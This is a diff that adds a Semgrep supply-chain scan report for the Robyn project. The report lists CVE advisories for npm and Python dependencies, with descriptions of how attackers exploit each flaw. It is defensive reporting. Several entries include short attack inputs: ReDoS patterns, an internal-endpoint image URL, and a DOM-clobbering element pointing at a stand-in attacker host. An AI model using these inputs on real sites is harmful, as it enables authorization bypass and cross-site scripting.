+          Severity: HIGH                                                                                     
+          Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity.        
+          `minimatch()` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing        
+          attacker-controlled extglob patterns: nested `*()` or `+()` extglobs are compiled into regexes with
+          nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which can trigger catastrophic backtracking in
+          V8 and stall the Node.js event loop for seconds to minutes when matched against a crafted non-     
+          matching path string.                                                                              
+                                                                                                             
+           ▶▶┆ Fixed for minimatch at versions: 10.2.3, 3.1.4, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7
+          7262┆ "node_modules/minimatch": {
+   
+   ❯❯❱ yaml - CVE-2023-2251
+          Severity: HIGH                                                                                      
+          yaml versions >= 2.0.0-5 before 2.2.2 are vulnerable to Uncaught Exception. The packages            
+          documentation states the parseDocument() and parseAllDocuments() functions should never throw an    
+          exception, however, when these functions are fed an invalid input with >= 80 carriage return        
+          characters (\r), an exception is thrown, which originates in the prettifyError() function. Code that
+          parses user-supplied YAML input and relies on parseDocument or parseAllDocuments never throwing are 
+          vulnerable to denial of service attacks.                                                            
+                                                                                                              
+           ▶▶┆ Fixed for yaml at version: 2.2.2
+          7437┆ "node_modules/mrm-core/node_modules/yaml": {
+   
+    ❯❱ nanoid - CVE-2024-55565
+          Severity: MODERATE                                                                                  
+          Affected versions of nanoid are vulnerable to Loop with Unreachable Exit Condition ('Infinite       
+          Loop'). nanoid generators (nanoid, customAlphabet, customRandom) corrupt their internal random-byte 
+          pool offset when called with a fractional (non-integer) size argument. Depending on the runtime this
+          causes an infinite loop on `while (size--)`, returns predictable zero-filled output until the buffer
+          refills, or throws on buffer allocation, leading to denial of service or weak/predictable IDs.      
+                                                                                                              
+           ▶▶┆ Fixed for nanoid at versions: 3.3.8, 5.0.9
+          7473┆ "node_modules/nanoid": {
+   
+    ❯❱ nanoid - CVE-2024-55565
+          Severity: MODERATE                                                                                  
+          Affected versions of nanoid are vulnerable to Loop with Unreachable Exit Condition ('Infinite       
+          Loop'). nanoid generators (nanoid, customAlphabet, customRandom) corrupt their internal random-byte 
+          pool offset when called with a fractional (non-integer) size argument. Depending on the runtime this
+          causes an infinite loop on `while (size--)`, returns predictable zero-filled output until the buffer
+          refills, or throws on buffer allocation, leading to denial of service or weak/predictable IDs.      
+                                                                                                              
+           ▶▶┆ Fixed for nanoid at versions: 3.3.8, 5.0.9
+          7473┆ "node_modules/nanoid": {
+   
+   ❯❯❱ next - CVE-2024-34351
+          Severity: HIGH                                                                                      
+          Affected versions of next are vulnerable to Server-Side Request Forgery (SSRF). An attacker can make
+          requests that appear to be originating from the Next.js application server itself.                  
+                                                                                                              
+           ▶▶┆ Fixed for next at version: 14.1.1
+          7496┆ "node_modules/next": {
+   
+    ❯❱ next - CVE-2024-56332
+          Severity: MODERATE                                                                                  
+          Affected versions of next are vulnerable to Allocation of Resources Without Limits or Throttling. An
+          attacker can send a Server Action request with an abruptly closed connection or invalid Content-    
+          Length header, causing the internal React Flight Reply decoder to create perpetually-pending promise
+          chunks that never resolve. This leaves the server connection hanging indefinitely until the hosting 
+          provider times out execution, resulting in a denial of service.                                     
+                                                                                                              
+           ▶▶┆ Fixed for next at versions: 13.5.8, 14.2.21, 15.1.2
+          7496┆ "node_modules/next": {
+   
+    ❯❱ next - CVE-2025-57822
+          Severity: MODERATE                                                                                  
+          Affected versions of next are vulnerable to Server-Side Request Forgery (SSRF). An attacker can     
+          exploit this SSRF vulnerability by injecting a crafted Location header into a request; if middleware
+          forwards request headers to NextResponse.next(), the Next.js server will make a server-side HTTP    
+          request to the attacker-supplied URL and return the response to the client.                         
+                                                                                                              
+           ▶▶┆ Fixed for next at versions: 14.2.32, 15.4.7
+          7496┆ "node_modules/next": {
+   
+    ❯❱ next - CVE-2025-55173
+          Severity: MODERATE                                                                                  
+          Affected versions of next are vulnerable to Improper Input Validation. Next.js Image Optimization   
+          (`/_next/image`) is affected by two related vulnerabilities fixed together. First, regardless of    
+          configuration, the image optimizer forwarded all inbound request headers — including cookies and    
+          authentication tokens — to internal API routes when proxying relative image URLs (e.g.              
+          `/_next/image? url=/api/private-endpoint`), allowing an attacker to make authenticated requests to  
+          internal endpoints through the public image optimizer. Second, if `images.domains` or               
+          `images.remotePatterns` is configured, an attacker who controls an allowed external image server can
+          serve non-image content that bypasses magic-number content-type detection; Next.js falls back to the
+          upstream `Content-Type` header and serves the arbitrary payload as a file download under the trusted
+          application domain — enabling phishing, drive-by downloads, or malicious file delivery.             
+                                                                                                              
+           ▶▶┆ Fixed for next at versions: 14.2.31, 15.4.5
+          7496┆ "node_modules/next": {
+   
+   ❯❯❯❱ next - CVE-2025-29927
+          Severity: CRITICAL                                                                              
+          Affected versions of next are vulnerable to Improper Authorization / Incorrect Authorization.   
+          Next.js middleware-based authorization checks can be bypassed by an attacker who forges external
+          requests that include a specific header, tricking the application into treating the request as a
+          trusted internal call and thus bypassing access controls.                                       
+                                                                                                          
+           ▶▶┆ Fixed for next at versions: 12.3.5, 13.5.9, 14.2.25, 15.2.3
+          7496┆ "node_modules/next": {
+   
+   ❯❯❱ next - CVE-2024-34350
+          Severity: HIGH                                                                                      
+          Affected versions of next are vulnerable to Inconsistent Interpretation of HTTP Requests ('HTTP     
+          Request/Response Smuggling'). Routes making use of the rewrites feature in Next.js are vulnerable to
+          HTTP request smuggling. An attacker can send crafted requests to these endpoint in order to trigger 
+          desynchronized responses.                                                                           
+                                                                                                              
+           ▶▶┆ Fixed for next at version: 13.5.1
+          7496┆ "node_modules/next": {
+   
+   ❯❯❱ next - CVE-2026-44573
+          Severity: HIGH                                                                                     
+          Affected versions of next are vulnerable to Incorrect Authorization. Next.js Pages Router          
+          applications that enable the built-in i18n configuration are vulnerable to a middleware / proxy    
+          authorization bypass: the data-route matcher does not run middleware or proxy code on locale-less  
+          /_next/data/<buildId>/<page>.json requests, allowing an attacker to retrieve SSR JSON for protected
+          pages without passing the intended authorization checks.                                           
+                                                                                                             
+           ▶▶┆ Fixed for next at versions: 15.5.16, 16.2.5
+          7496┆ "node_modules/next": {
+   
+   ❯❯❱ next - CVE-2024-51479
+          Severity: HIGH                                                                                    
+          Affected versions of next are vulnerable to Improper Authorization / Incorrect Authorization.     
+          Improper authorization handling in Next.js applications enables attackers to bypass security      
+          controls for paths directly under the application's root directory, potentially exposing sensitive
+          data or functionality. This issue affects versions prior to Next.js 14.2.15, where authorization  
+          logic based solely on pathname fails to account for certain direct page accesses.                 
+                                                                                                            
+           ▶▶┆ Fixed for next at version: 14.2.15
+          7496┆ "node_modules/next": {
+   
+   ❯❯❱ parse-git-config - CVE-2025-25975
+          Severity: HIGH                                                                                    
+          Affected versions of parse-git-config are vulnerable to Exposure of Sensitive Information to an   
+          Unauthorized Actor / Improperly Controlled Modification of Object Prototype Attributes ('Prototype
+          Pollution'). An attacker can leverage the `expandKeys` function to perform prototype pollution by 
+          supplying a malicious configuration. This allows them to manipulate the global prototype chain,   
+          potentially influencing sensitive Node.js APIs such as exec or eval, which may lead to arbitrary  
+          command execution.                                                                                
+                                                                                                            
+           ▶▶┆ Fixed for parse-git-config at version: 
+          8971┆ "node_modules/parse-git-config": {
+   
+   ❯❯❱ picomatch - CVE-2026-33671
+          Severity: HIGH                                                                                      
+          Affected versions of picomatch are vulnerable to Inefficient Regular Expression Complexity.         
+          Picomatch can compile certain extglob patterns (for example quantified +() and *() forms) into      
+          regular expressions with catastrophic backtracking, causing ReDoS and event-loop blocking when those
+          patterns are compiled or matched                                                                    
+                                                                                                              
+           ▶▶┆ Fixed for picomatch at versions: 2.3.2, 3.0.2, 4.0.4
+          9062┆ "node_modules/picomatch": {
+   
+    ❯❱ postcss - CVE-2023-44270
+          Severity: MODERATE                                                                                  
+          Affected versions of postcss are vulnerable to Improper Neutralization Of Special Elements In Output
+          Used By A Downstream Component ('Injection') / Improper Neutralization Of Line Delimiters. The      
+          vulnerability arises due to insufficient input validation within the affected package while parsing 
+          external Cascading Style Sheets (CSS) using linters that employ PostCSS, and it is specifically     
+          attributed to the utilization of an insecure regular expression denoted by the variable             
+          `RE_BAD_BRACKET`                                                                                    
+                                                                                                              
+           ▶▶┆ Fixed for postcss at version: 8.4.31
+          9089┆ "node_modules/postcss": {
+   
+    ❯❱ prismjs - CVE-2024-53382
+          Severity: MODERATE                                                                                 
+          Affected versions of prismjs are vulnerable to Improper Control of Generation of Code ('Code       
+          Injection') / Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').
+          PrismJS before 1.30.0 contains a DOM Clobbering vulnerability: the library's core initialization   
+          reads document.currentScript without verifying it is a <script> element, so an attacker-injected   
+          HTML element (e.g. <img name="currentScript">) can shadow document.currentScript. Combined with the
+          autoloader plugin, this lets an attacker control the base path used to load language components,   
+          resulting in loading scripts from an attacker-controlled origin and cross-site scripting. Because  
+          the vulnerable code runs at library load time, every importer of an affected version is exposed;   
+          upgrade to 1.30.0 or later.                                                                        
+                                                                                                             
+           ▶▶┆ Fixed for prismjs at version: 1.30.0
+          9334┆ "node_modules/prismjs": {
+   
+    ❯❱ prismjs - CVE-2024-53382
+          Severity: MODERATE                                                                                 
+          Affected versions of prismjs are vulnerable to Improper Control of Generation of Code ('Code       
+          Injection') / Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').
+          PrismJS before 1.30.0 contains a DOM Clobbering vulnerability: the library's core initialization   
+          reads document.currentScript without verifying it is a <script> element, so an attacker-injected   
+          HTML element (e.g. <img name="currentScript">) can shadow document.currentScript. Combined with the
+          autoloader plugin, this lets an attacker control the base path used to load language components,   
+          resulting in loading scripts from an attacker-controlled origin and cross-site scripting. Because  
+          the vulnerable code runs at library load time, every importer of an affected version is exposed;   
+          upgrade to 1.30.0 or later.                                                                        
+                                                                                                             
+           ▶▶┆ Fixed for prismjs at version: 1.30.0
+          9334┆ "node_modules/prismjs": {
+   
+    ❯❱ prismjs - CVE-2024-53382
+          Severity: MODERATE                                                                                 
+          Affected versions of prismjs are vulnerable to Improper Control of Generation of Code ('Code       
+          Injection') / Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').
+          PrismJS before 1.30.0 contains a DOM Clobbering vulnerability: the library's core initialization   
+          reads document.currentScript without verifying it is a <script> element, so an attacker-injected   
+          HTML element (e.g. <img name="currentScript">) can shadow document.currentScript. Combined with the
+          autoloader plugin, this lets an attacker control the base path used to load language components,   
+          resulting in loading scripts from an attacker-controlled origin and cross-site scripting. Because  
+          the vulnerable code runs at library load time, every importer of an affected version is exposed;   
+          upgrade to 1.30.0 or later.                                                                        
+                                                                                                             
+           ▶▶┆ Fixed for prismjs at version: 1.30.0
+          10027┆ "node_modules/refractor/node_modules/prismjs": {
+   
+    ❯❱ prismjs - CVE-2024-53382
+          Severity: MODERATE                                                                                 
+          Affected versions of prismjs are vulnerable to Improper Control of Generation of Code ('Code       
+          Injection') / Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').
+          PrismJS before 1.30.0 contains a DOM Clobbering vulnerability: the library's core initialization   
+          reads document.currentScript without verifying it is a <script> element, so an attacker-injected   
+          HTML element (e.g. <img name="currentScript">) can shadow document.currentScript. Combined with the
+          autoloader plugin, this lets an attacker control the base path used to load language components,   
+          resulting in loading scripts from an attacker-controlled origin and cross-site scripting. Because  
+          the vulnerable code runs at library load time, every importer of an affected version is exposed;   
+          upgrade to 1.30.0 or later.                                                                        
+                                                                                                             
+           ▶▶┆ Fixed for prismjs at version: 1.30.0
+          10027┆ "node_modules/refractor/node_modules/prismjs": {
+   
+   ❯❯❱ semver - CVE-2022-25883
+          Severity: HIGH                                                                                  
+          Affected versions of semver are vulnerable to Inefficient Regular Expression Complexity. The    
+          vulnerability exists in the package semver allowing Regular Expression Denial of Service (ReDoS)
+          through the `new Range` when untrusted user data is input as a range.                           
+                                                                                                          
+           ▶▶┆ Fixed for semver at versions: 5.7.2, 6.3.1, 7.5.2
+          11203┆ "node_modules/semver": {
+   
+    ❯❱ serialize-javascript - CVE-2024-11831
+          Severity: MODERATE                                                                                  
+          Affected versions of serialize-javascript are vulnerable to Improper Neutralization of Input During 
+          Web Page Generation ('Cross-site Scripting'). The `serialize()` function in `serialize-javascript`  
+          does not HTML-escape the string representation of `URL` objects, allowing injection of raw          
+          `</script>` sequences and other HTML-special characters. An attacker who controls a URL value passed
+          to `serialize()` can break out of an inline `<script>` tag context and execute arbitrary JavaScript,
+          causing cross-site scripting (XSS).                                                                 
+                                                                                                              
+           ▶▶┆ Fixed for serialize-javascript at version: 6.0.2
+          11242┆ "node_modules/serialize-javascript": {
+   
+   ❯❯❱ serialize-javascript - GHSA-5c6j-r48x-rmvq
+          Severity: HIGH                                                                                      
+          Affected versions of serialize-javascript are vulnerable to Improper Neutralization of Directives in
+          Statically Saved Code ('Static Code Injection'). `serialize-javascript` is vulnerable to code       
+          injection when serializing non-plain objects that masquerade as `RegExp` or `Date`. The library     
+          sanitizes `RegExp.source` but interpolates `RegExp.flags` (and similarly the result of              
+          `Date.prototype.toISOString()`) directly into the generated JavaScript without escaping, allowing an
+          attacker who controls the input to `serialize()` to inject arbitrary JavaScript into the serialized 
+          output. If the consumer later evaluates that string (e.g., via `eval`, `new Function`, or embedding 
+          in a `<script>` tag), the injected payload executes and can lead to remote code execution in        
+          Node.js.                                                                                            
+                                                                                                              
+           ▶▶┆ Fixed for serialize-javascript at version: 7.0.3
+          11242┆ "node_modules/serialize-javascript": {
+   
+    ❯❱ postcss - CVE-2023-44270
+          Severity: MODERATE                                                                                  
+          Affected versions of postcss are vulnerable to Improper Neutralization Of Special Elements In Output
+          Used By A Downstream Component ('Injection') / Improper Neutralization Of Line Delimiters. The      
+          vulnerability arises due to insufficient input validation within the affected package while parsing 
+          external Cascading Style Sheets (CSS) using linters that employ PostCSS, and it is specifically     
+          attributed to the utilization of an insecure regular expression denoted by the variable             
+          `RE_BAD_BRACKET`                                                                                    
+                                                                                                              
+           ▶▶┆ Fixed for postcss at version: 8.4.31
+          11687┆ "node_modules/tailwindcss/node_modules/postcss": {
+   
+   ❯❯❱ tmp - CVE-2026-44705
+          Severity: HIGH                                                                                     
+          Affected versions of tmp are vulnerable to Improper Limitation of a Pathname to a Restricted       
+          Directory ('Path Traversal'). The tmp package is vulnerable to path traversal (CWE-22). The prefix,
+          postfix, template, and dir options passed to file, fileSync, dir, dirSync, tmpName, and tmpNameSync
+          are concatenated into the generated path without sanitization, so traversal sequences (../) or     
+          absolute paths allow files and directories to be created outside the intended temporary directory. 
+                                                                                                             
+           ▶▶┆ Fixed for tmp at version: 0.2.6
+          11820┆ "node_modules/tmp": {
+   
+    ❯❱ webpack - CVE-2024-43788
+          Severity: MODERATE                                                                                
+          Affected versions of webpack are vulnerable to Improper Neutralization of Input During Web Page   
+          Generation ('Cross-site Scripting'). webpack's AutoPublicPathRuntimeModule emits runtime code that
+          derives the asset public path from document.currentScript. Because document.currentScript can be  
+          DOM-clobbered by an injected scriptless element (e.g. <img name="currentScript"                   
+          src="https://attacker.example/">), an attacker who can inject markup into the page can redirect   
+          dynamic chunk/asset loading to an attacker-controlled origin, resulting in cross-site scripting   
+          (XSS).                                                                                            
+                                                                                                            
+           ▶▶┆ Fixed for webpack at version: 5.94.0
+          12487┆ "node_modules/webpack": {
+   
+    ❯❱ word-wrap - CVE-2023-26115
+          Severity: MODERATE                                                                                  
+          Affected versions of word-wrap are vulnerable to Inefficient Regular Expression Complexity. word-   
+          wrap is vulnerable to Regular Expression Denial of Service (ReDoS). When the default-exported wrap()
+          function is called with the `trim: true` option, the trailing-whitespace regex `/[ \t]*$/gm`        
+          exhibits worst-case super-linear backtracking, allowing an attacker who controls the input string to
+          consume excessive CPU.                                                                              
+                                                                                                              
+           ▶▶┆ Fixed for word-wrap at version: 1.2.4
+          12628┆ "node_modules/word-wrap": {
+   
+    ❯❱ zod - CVE-2023-4316
+          Severity: MODERATE                                                                                 
+          Affected versions of zod are vulnerable to Inefficient Regular Expression Complexity. Zod's        
+          `z.string().email()` validator is backed by a regular expression with catastrophic backtracking. An
+          attacker who controls the validated string can supply a crafted input that forces the email regex  
+          into exponential evaluation time, exhausting CPU and causing a denial of service (ReDoS).          
+                                                                                                             
+           ▶▶┆ Fixed for zod at version: 3.22.3
+          12921┆ "node_modules/zod": {
+               
+    poetry.lock
+    ❯❱ filelock - CVE-2026-22701
+          Severity: MODERATE                                                                               
+          Affected versions of filelock are vulnerable to Concurrent Execution using Shared Resource with  
+          Improper Synchronization ('Race Condition') / Improper Link Resolution Before File Access ('Link 
+          Following') / Time-of-check Time-of-use (TOCTOU) Race Condition. filelock's SoftFileLock acquires
+          locks by creating the lock file after a separate writability check, with no protection against   
+          symlinks. A local attacker who can write to the lock-file directory can plant a symlink in the   
+          window between the check and os.open(), redirecting the lock operation to an attacker-controlled 
+          file. This causes silent lock-acquisition failures, denial of service, or writes to unintended   
+          files. The soft lock is used directly, as the FileLock fallback when fcntl is unavailable, and on
+          platforms lacking os.O_NOFOLLOW.                                                                 
+                                                                                                           
+           ▶▶┆ Fixed for filelock at version: 3.20.3
+          318┆ name = "filelock"
+   
+    ❯❱ filelock - CVE-2025-68146
+          Severity: MODERATE                                                                                  
+          Affected versions of filelock are vulnerable to Concurrent Execution using Shared Resource with     
+          Improper Synchronization ('Race Condition') / Improper Link Resolution Before File Access ('Link    
+          Following') / Time-of-check Time-of-use (TOCTOU) Race Condition. filelock is vulnerable to a TOCTOU 
+          race condition in its hard file-lock implementation. Because lock acquisition checks for the lock   
+          file and then opens it with O_TRUNC without O_NOFOLLOW (Unix) or reparse-point detection (Windows), 
+          a local attacker can plant a symlink in the gap between the check and the open, causing filelock to 
+          follow the symlink and truncate/corrupt an arbitrary victim-owned file. SoftFileLock is not affected
+          because it opens with O_CREAT | O_EXCL and does not truncate.                                       
+                                                                                                              
+           ▶▶┆ Fixed for filelock at version: 3.20.1
+          318┆ name = "filelock"
+   
+   ❯❯❱ urllib3 - CVE-2026-21441
+          Severity: HIGH                                                                                      
+          Affected versions of urllib3 are vulnerable to Improper Handling of Highly Compressed Data (Data    
+          Amplification). When using urllib3's streaming API (preload_content=False) with redirects enabled,  
+          redirect responses are fully drained and decompressed before any read calls—ignoring configured read
+          limits—allowing a malicious server to send a compressed payload that expands into massive data and  
+          triggers excessive CPU and memory consumption (decompression bomb).                                 
+                                                                                                              
+           ▶▶┆ Fixed for urllib3 at version: 2.6.3
+          1164┆ name = "urllib3"
+   
+   ❯❯❱ urllib3 - CVE-2025-66418
+          Severity: HIGH                                                                                      
+          Affected versions of urllib3 are vulnerable to Allocation of Resources Without Limits or Throttling.
+          The vulnerability in urllib3 arises because a malicious server can provide an unbounded chain of    
+          content-encoding layers that urllib3 will fully decompress, causing unrestrained CPU usage and      
+          memory growth.                                                                                      
+                                                                                                              
+           ▶▶┆ Fixed for urllib3 at version: 2.6.0
+          1164┆ name = "urllib3"
+   
+   ❯❯❱ urllib3 - CVE-2025-66471
+          Severity: HIGH                                                                                     
+          Affected versions of urllib3 are vulnerable to Improper Handling of Highly Compressed Data (Data   
+          Amplification). An attacker hosting a highly-compressed HTTP response can trigger urllib3's        
+          streaming API to decompress entire compressed blocks when the client requests only a small chunk   
+          (via stream(), read(), read1(), read_chunked(), or readinto()). This can cause excessive CPU usage 
+          and large memory allocations on the client (resource exhaustion), resulting in a denial-of-service.
+                                                                                                             
+           ▶▶┆ Fixed for urllib3 at version: 2.6.0
+          1164┆ name = "urllib3"
+   
+   ❯❯❱ urllib3 - CVE-2026-44431
+          Severity: HIGH                                                                                     
+          Affected versions of urllib3 are vulnerable to Exposure of Sensitive Information to an Unauthorized
+          Actor. HTTP pools obtained from urllib3 ProxyManager via connection_from_url() or                  
+          connection_from_host() do not strip sensitive headers (Authorization, Cookie, Proxy-Authorization) 
+          when following cross-origin redirects, leaking authentication credentials to the redirect target.  
+          Use ProxyManager.request() (the high-level API) instead, or upgrade to urllib3 >= 2.7.0.           
+                                                                                                             
+           ▶▶┆ Fixed for urllib3 at version: 2.7.0
+          1164┆ name = "urllib3"
+
+
+=== STDERR ===
+                  
+                  
+┌────────────────┐
+│ Debugging Info │
+└────────────────┘
+                  
+  SCAN ENVIRONMENT
+  versions    - semgrep 1.168.0 on python 3.12.13                      
+  environment - running in environment git, triggering event is unknown
+            
+  CONNECTION
+  Initializing scan (deployment=wuwuyn-personal-org, scan_id=192914348)  
+  Enabled products: Supply Chain                                                 
+        
+  ENGINE
+  Using Semgrep Pro Version: 1.168.0
+  Installed at /usr/lib/python3.12/site-packages/semgrep/bin/semgrep-core-proprietary
+               
+               
+┌─────────────┐
+│ Scan Status │
+└─────────────┘
+  Scanning 403 files tracked by git with 0 Code rules, 103656 Supply Chain rules:
+            
+            
+  CODE RULES
+  Nothing to scan.
+                    
+  SUPPLY CHAIN RULES
+                                                                                                                        
+  Dependency Sources                           Resolution Method                     Ecosystem   Dependencies   Rules   
+ ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
+  docs_src/package-lock.json                   Lockfile                              Npm         911            84986   
+  Cargo.lock                                   Lockfile                              Cargo       233             1464   
+  poetry.lock                                  Lockfile                              Pypi        57             17206   
+  robyn/scaffold/mongo/requirements.txt        Lockfile                              Pypi        0              17206   
+  robyn/scaffold/no-db/requirements.txt        Lockfile                              Pypi        0              17206   
+  robyn/scaffold/postgres/requirements.txt     Lockfile                              Pypi        0              17206   
+  robyn/scaffold/prisma/requirements.txt       Lockfile                              Pypi        0              17206   
+  robyn/scaffold/sqlalchemy/requirements.txt   Lockfile                              Pypi        0              17206   
+  robyn/scaffold/sqlite/requirements.txt       Lockfile                              Pypi        0              17206   
+  robyn/scaffold/sqlmodel/requirements.txt     Lockfile                              Pypi        0              17206   
+  setup.py                                     Disabled (use --allow-local-builds)   Unknown     -                  -   
+                                                                                                                        
+                                                                                                                        
+  Analysis       Rules                                                                                                  
+ ──────────────────────                                                                                                 
+  Malicious      89026                                                                                                  
+  Basic          10592                                                                                                  
+  Reachability    4038                                                                                                  
+                                                                                                                        
+  Failed to parse [bold]robyn/scaffold/mongo/requirements.txt[/bold] at [bold]1[/bold] - Skipping dependency 'robyn'    
+  because it is not pinned to an exact version                                                                          
+  Failed to parse [bold]robyn/scaffold/mongo/requirements.txt[/bold] at [bold]2[/bold] - Skipping dependency 'pymongo'  
+  because it is not pinned to an exact version                                                                          
+  Failed to parse [bold]robyn/scaffold/no-db/requirements.txt[/bold] at [bold]1[/bold] - Skipping dependency 'robyn'    
+  because it is not pinned to an exact version                                                                          
+  Failed to parse [bold]robyn/scaffold/postgres/requirements.txt[/bold] at [bold]1[/bold] - Skipping dependency 'robyn' 
+  because it is not pinned to an exact version                                                                          
+  Failed to parse [bold]robyn/scaffold/postgres/requirements.txt[/bold] at [bold]2[/bold] - Skipping dependency         
+  'psycopg2;' because it is not pinned to an exact version                                                              
+  Failed to parse [bold]robyn/scaffold/postgres/requirements.txt[/bold] at [bold]3[/bold] - Skipping dependency         
+  'psycopg2-binary;' because it is not pinned to an exact version                                                       
+  Failed to parse [bold]robyn/scaffold/prisma/requirements.txt[/bold] at [bold]1[/bold] - Skipping dependency 'robyn'   
+  because it is not pinned to an exact version                                                                          
+  Failed to parse [bold]robyn/scaffold/prisma/requirements.txt[/bold] at [bold]2[/bold] - Skipping dependency 'prisma'  
+  because it is not pinned to an exact version                                                                          
+  Failed to parse [bold]robyn/scaffold/sqlalchemy/requirements.txt[/bold] at [bold]1[/bold] - Skipping dependency       
+  'robyn' because it is not pinned to an exact version                                                                  
+  Failed to parse [bold]robyn/scaffold/sqlalchemy/requirements.txt[/bold] at [bold]2[/bold] - Skipping dependency       
+  'SQLAlchemy' because it is not pinned to an exact version                                                             
+  Failed to parse [bold]robyn/scaffold/sqlite/requirements.txt[/bold] at [bold]1[/bold] - Skipping dependency 'robyn'   
+  because it is not pinned to an exact version                                                                          
+  Failed to parse [bold]robyn/scaffold/sqlmodel/requirements.txt[/bold] at [bold]1[/bold] - Skipping dependency 'robyn' 
+  because it is not pinned to an exact version                                                                          
+  Failed to parse [bold]robyn/scaffold/sqlmodel/requirements.txt[/bold] at [bold]2[/bold] - Skipping dependency         
+  'sqlmodel' because it is not pinned to an exact version                                                               
+  Uploading scan results  
+  Finalizing scan                         
+                
+┌──────────────┐
+│ Scan Summary │
+└──────────────┘
+✅ CI scan completed successfully.
+ • Findings: 161 (0 blocking)
+ • Rules run: 127478
+ • Targets scanned: 201
+ • Parsed lines: ~100.0%
+ • Scan skipped: 
+   ◦ Files matching .semgrepignore patterns: 1
+ • Scan was limited to files tracked by git
+ • For a detailed list of skipped files and lines, run semgrep with the --verbose flag
+CI scan completed successfully.
+  View results in Semgrep Cloud Platform:
+    https://semgrep.dev/orgs/wuwuyn-personal-org/supply-chain/vulnerabilities?repo=sparckles__Robyn&ref=HEAD
+  No blocking findings so exiting with code 0
